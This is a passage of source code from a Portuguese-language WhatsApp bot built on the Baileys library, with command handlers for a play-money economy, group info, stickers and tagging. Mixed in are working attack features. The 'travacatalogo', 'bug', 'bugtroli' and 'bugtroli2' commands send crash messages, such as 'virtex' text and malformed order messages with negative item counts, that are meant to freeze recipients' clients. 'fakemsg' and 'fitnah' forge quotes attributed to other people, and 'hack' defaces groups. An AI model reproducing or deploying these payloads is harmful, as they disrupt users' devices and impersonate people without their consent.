					await reply(`🔪BANG!!!💣\n\nVocê perdeu na roleta-russa, causando uma perca de ${nrolxp} em seu dinheiro.`)
					add_dinheiro(sender, nrolxp, dinheiro)
					add_dinheiro('5555933005901@s.whatsapp.net', prolxp)
		   } else if (double == 2) {
					await reply(`🥳 PARABÉNS 🥳\n\nUfa 😅 você ganhou no jogo do azar\n sua recompensa: ${prolxp} dinheiro`)
					add_dinheiro(sender, prolxp, dinheiro)
			}
			break
			
case 'infogrupo':
       case 'gpinfo':
       case 'grupoinfo':
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await edward.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R U P O I N F O*\n\n*Nome :* ${groupName}\n*ID :* ${from}\n*Criado em :* ${moment(`${groupMetadata.creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n*Criador do gp :* @${groupMetadata.owner.split('@')[0]}\n*Quantidade de admins :* ${groupAdmins.length}\n*Número de participantes :* ${groupMembers.length}\n*AntiLink :* ${isAntilink ? 'ativado' : 'desativado'}\n*Descrição :* \n${groupMetadata.desc}`
              edward.sendMessage(from, await getBuffer(pic), image, {quoted: mek, thumbnail: null, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
             break			

case 'dompet':          
      case 'dinhero':          
      case 'dinheiro':       
	     case 'meudinhero':	  	  
				const dindin = verificar_dinheiro(sender)
				sayo = `*┏⊱ 「 🤑DINHEIRO🤑 」⊰━┓*\n┣⊱ *Nome* : ${pushname}\n┣⊱ *Número* : ${sender.split("@")[0]}\n┣⊱ *Dinhero* : ${dindin}\n┗━━━━━━━━━━`
				reply(sayo)
break
//------------------< Level >-------------------
    /*  case 'level': 
              if (!isGroup) return reply(mess.only.group)
              if (!isLevelingOn) return await reply('Ative o modo leveling...!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              const dinheiror = verificar_dinheiro(sender)
              try {
              profilePic = await edward.getProfilePicture(sender)
              } catch {
              profilePic = errorImg
}
              buffer = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=najisbaperanRw&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
              teks = `*「 LEVEL 」*\n\n➸ *Nome :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Patente*: *${role}*\n➸ *Dinheiro*: ${dinheiror}\n\n*Nota : Colete XP se quiser subir de nível*`
              edward.sendMessage(from, buffer, image, { caption: teks, quoted: mek})
              break

				*/
                case 'transfer':
             			case 'transferir':             						       
            				if (!c.includes('/')) return  reply(`[❗] Use assim : ${prefix + command} @/2500`)
                const recebidor = c.substring(0, c.indexOf('/') - 1)
                const quantia = c.substring(c.lastIndexOf('/') + 1)
                if(isNaN(quantia)) return await reply('[❗] PRECISA SER UM NÚMERO')
                if (quantia < 100 ) return reply(`transfrência mínima e de 100 reais`)
                if (verificar_dinheiro(sender) < quantia) return reply(`[❗] você não tem dinheiro suficiente para fazer uma transferência, você precisa ter no minímo 100 de dinhero`)
                const recebidorr = `${recebidor.replace("@", '')}@s.whatsapp.net`
                fee = 0.010 *  quantia //IMPOSTO CADA 1 DE DINHERO, ALMENTA E CAI NA SUA CONTA, TODA VEZ QUÊ ALGHEM FASER TRANSFERENCIA
                hasiltf = quantia - fee
                add_dinheiro(recebidorr, hasiltf)
                confirma_dinheiro(sender, quantia)
                add_dinheiro('5555933005901@s.whatsapp.net', fee)
                reply(`💱TRANSFERÊNCIA💱\n\n✙◗🤵🏻‍♂transferidor🤵🏻‍♂: wa.me/${sender.split("@")[0]}\n✙◗recebidor : +${recebidor}\n✙◗valor da transferência : ${quantia}🤑\n✙◗imposto : ${fee}`)             
break                
		    case 'slot':
            case 'slots':
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            edward.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nNota: Se você obtiver 3 frutas iguais, significa que você ganhou\n\nExemplo : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
				case 'criarctt':
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Use assim: ${prefix + command} @tag|nome`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
				case 'contag':
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return reply(mess.only.admin)
                argzi = arg.split('|')
				if (!argzi) return reply(`Use assim: ${prefix + command} @tag|nome`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
				case 'getdecgp':
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await edward.groupMetadata(anu)
				edward.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
					case 'roubarbio':
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await edward.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
                    case 'getnome':
                    case 'roubarnome':
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = edward.contacts[ambl] != undefined ? edward.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : edward.contacts[ambl].notify || edward.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await edward.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            edward.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
			if (args[0].startsWith('55')) return reply('você só pode conversar com Pessoas do Brasil *+55*')
            if (args[0].startsWith('+55')) return reply('você só pode conversar com Pessoas do Brasil *+55*')
			if (args.length < 1) return reply(`Use assim ${prefix + command} @55+×+×+×+×|msg`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            edward.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sucesso ao enviar a mensagem:\n${org},@${nomor}`)
            break
            case 'reportar':
            case 'report':
            if (!c) return reply(`Use assim ${prefix + command}`)
            suporte = `‼️RELATÓRIO DE BUG‼️\nnome: ${pushname}\nnúmero: wa.me/${sender.split('@')[0]}\n\nbug: *_${c}_*`
            edward.sendMessage(NumeroCriador+'@s.whatsapp.net', suporte, MessageType.text, {quoted: mek})   
            reply(`Sucesso ao enviar o feedback...\n${c}`)
            break
				case 'attp':				
					if (!c) return reply(`Coloque o texto\nExemplo :\n${prefix}attp ${NomeBot}`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					edward.sendMessage(from, atetepe, sticker, { quoted: mek })
					//await limitAdd(sender)
					break
    	   case 'emoji_app':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[0].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_mi':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[3].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_wa':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_fb':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[6].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_go':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[1].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_lg':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[11].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_ht':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[12].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_mo':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[14].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_tw':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[5].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_sa':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[2].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_pi':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[7].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break

case 'emoji_op':
if (args.length < 1) return reply(`*✳️ Como Usar o Comando:*\n\n${prefix + command} ❤️`)
reply(mess.wait) 
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[8].url}`
sendStickerUrl(from,`${teks}`)	
console.log('  ✅ emoji a sticker ' )
})
.catch((err) => {
reply('❎ Por favor insira apenas um emoji'); 
 })
break
				case 'tag':
			if (args.length < 1) return reply(`Use assim ${prefix}tag 55xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					edward.sendMessage(from, tagq, text, { quoted: say1, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					edward.sendMessage(from, tagu, text, { quoted: say1, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				 if (args.length < 1) return ephe('Preciso do link do grupo amg')
					edward.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply(`Sucesso ao entrar nesse grupo\n${quey}`)
break
				case 'totag':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await edward.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await edward.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            edward.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`Marque/documento/gif/figurinha/áudio/vídeo usando ${prefix + command}`)
        }
        break
				case 'tobc':
				case 'totm':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				edward.updatePresence(from, Presence.composing)
					anu = await edward.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							edward.sendMessage(_.jid, buff, audio, { quoted: say1 })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							edward.sendMessage(_.jid, buff, sticker, { quoted: say1, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('Marque sticker/audio')
							}
					break
					case 'fdeface':
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
                                var titlenye = nn.split("|")[1];
                                var descnye = nn.split("|")[2];
                                imgbbb = require('imgbb-uploader')
                                run = getRandom('.jpeg')
                                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                                mediad = await edward.downloadAndSaveMediaMessage(encmediad)
                                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                                edward.sendMessage(from, {
                                        text: `${urlnye}`,
                                        matchedText: `${urlnye}`,
                                        canonicalUrl: `${urlnye}`,
                                        description: `${descnye}`,
                                        title: `${titlenye}`,
                                        jpegThumbnail: ddatae
                                }, 'extendedTextMessage', { detectLinks: false })
                                break
                                break
           case 'fakemsg':
                if (args.length < 1) return reply(`Use assim :\n${prefix + command} [número|msg|resposta do bot]]\n\nEx : \n${prefix + command} 0|olá|Olá tudo bem?`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
				var bot = gh.split("|")[2];
			    edward.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
           case 'hidetag':
            if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.onl)
            ht = body.slice(9)
                members_id = []
				for (let mem of groupMembers) {
					members_id.push(mem.jid)
				}
                mentions(ht, members_id, false)
                break
            case 'fitnah':
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
							extendedTextMessage: {
								text: cs[1]
							}
						}
					}
				}
				edward.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length < 1) return reply('Cadê o texto?')
              reply('Hackeando...')
                tessgc = await getBuffer(`https://telegra.ph/file/cd681756e7da095676a9c.jpg`)
                   edward.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                edward.groupUpdateSubject(from, `GRUPO HACKEADO POR ${body.slice(8)}`)
                await sleep(1000)
                edward.groupUpdateDescription(from, `_${pushname} está hackeando o grupo 🎃_`)             
                await sleep(1000)
                edward.sendMessage(from, 'Grupo hackeado com sucesso', text, {quoted: mek})
					break
					case 'hack':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              sendBug(from)
              edward.groupUpdateSubject(from, `HACKED BY SAYO`)
                edward.groupUpdateDescription(from, `_${me.jid}_`)
             edward.updateProfilePicture(from, fs.readFileSync('./arquivos/arquivos_mídia/image/me.jpg'))
                edward.sendMessage(from, 'Pronto!', text, {quoted: mek})
                await sleep(3000)
                edward.groupLeave(from)
					break
case 'akot':
buf = imgcriador
imeu = await edward.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await edward.prepareMessageFromContent(from,{
"productMessage": {
						"product": {
							"productImage": {
								"url": "https://mmg.whatsapp.net/d/f/AhvgtqZqR8b0oQENeZvezj0vxTzSKoCD31p3TqrCqIJD.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "2qr24L/qi7iz79Q/xCmpsxp0qHq1//HxIjESxskh8Ac=",
								"fileLength": "127335",
								"height": 1280,
								"width": 720,
								"mediaKey": "Wod9kPwwla1iL35fS3VbPOoepH31KUvJ9P940hafczI=",
								"fileEncSha256": "hycGQCjaA06Bhc3NZ6fKix1N6fy0wzCIbzH9gpX7Cnc=",
								"directPath": "/v/t62.7118-24/33309769_909071276396037_4251531337303377799_n.enc?ccb=11-4&oh=50ea5ec49c35d80025d1db92c035f3d0&oe=61AADDB3&_nc_hot=1636226519",
								"mediaKeyTimestamp": "1636226460",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAwIEBQEGAQADAQAAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADCX6Smqx4+nyRZxIs27OY6auZT8sSQCbU+r0vi2JlWimSt/OahthA3qBMSqTDCCIBwAP/EACYQAAICAgEDAgcAAAAAAAAAAAECAAMREgQhMUEQUhMUMlFhcXL/2gAIAQEAAT8AHGsIB0Masg4AOYabQAShmhAJYGadJS+6Ko9sQBbtsZOZbatiFEWchNag2cjML4+kzig67faPQXBavuZxqWy6lv3OYQqvWDnDelF7VdVaLzrUJ7T52xA5UgkyxnOS3k+iqFOCYf6mw94hGe7QJSaSSRsJlujAR2J7xqweqiMjL3Eye0eut1r8Cciv4ZgOFE7/AJEanHUSvnEJppLrDa+cTZdYbAFiWDyYrEecQWMTgtA7bY2mct1MLT//xAAdEQADAAEFAQAAAAAAAAAAAAAAARECECAhIlFx/9oACAECAQE/AKJkx9JWR6fDJMhjwyo67P/EABsRAAEEAwAAAAAAAAAAAAAAAAABEBEgEiEx/9oACAEDAQE/AMSDTK3BZpCU/9k="
							},
							"productId": "4659984794117282",
							"title": "edwardBOT v5",
							"description": "bot whatsapp completo",
							"currencyCode": "CAD",
							"priceAmount1000": "50000",
							"retailerId": "666",
							"url": "https://akame-apirest.herokuapp.com/docs",
							"productImageCount": 4,
							"salePriceAmount1000": "0"
						},
						"businessOwnerJid": "5555933005901@s.whatsapp.net",
 "contextInfo": {
 "forwardingScore": 0,
 "isForwarded": true, 
 }
 }
 }, {quoted: mek, thumbnail: null})
edward.relayWAMessage(res)
break	
case 'criador':
result = `a`
              buttons = [{buttonId: `gpofc`,buttonText:{displayText: `GRUPO 📞`},type:1},{buttonId: `igm`,buttonText:{displayText: `INSTA 🖼️`},type:1},{buttonId:`ctt`,buttonText:{displayText:'CONTATO 👤'},type:1}]
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(`https://i.ibb.co/qyBKJcv/Screenshot-20220105-001309.png`))
              imageMsg = ( await edward.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: null})).message.imageMessage
              buttonsMessage = {footerText:'oi manda msg pro meu dono', imageMessage: imageMsg,
              contentText:`meu dono ai`,buttons,headerType:4}
              sayo = await edward.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              edward.relayWAMessage(sayo)
              fs.unlinkSync(`./ytmp.jpeg`)
break					

case 'travacatalogo':
	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
		case 'bug':

					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)

					if (args.length < 1) return reply('Quantidade?')
				 for (let i = 0; i < args[0]; i++) {
await edward.toggleDisappearingMessages(from, 0)
}
reply('Bugs enviado com sucesso '+args.join(' '))
					break
				
					case 'bugtroli':
              if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
edward.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // falso sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: pperfil,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️akame☠️',
    orderTitle: 'AkameVirus', // nome
    sellerJid: '0@s.whatsapp.net' // whatsapp
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
edward.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Quantidade?')
		        try {
		        var hets = `${NomeBot}`
		        var grousp = await edward.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        edward.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "5562936180708@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${NomeBot}`,
						"orderTitle": `${NomeCriador}`,
						"sellerJid": "5562936180708@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        edward.sendMessage(from, 'Bug de carrinho 2 enviado com sucesso', text, {quoted:{ 
	    key: {
	    fromMe: false, 
